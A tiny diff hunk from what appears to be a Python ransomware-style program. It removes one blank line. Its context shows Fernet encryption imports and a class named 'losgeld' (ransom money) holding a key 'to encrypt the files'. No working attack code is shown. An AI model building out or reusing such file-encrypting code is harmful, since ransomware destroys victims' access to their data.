@@ -3,7 +3,6 @@ import sys
 from os.path import expanduser
 from cryptography.fernet import Fernet
 
-
 class losgeld(object):
     def __init__(self):
         self.key = None                     # Key to encrpyt the files
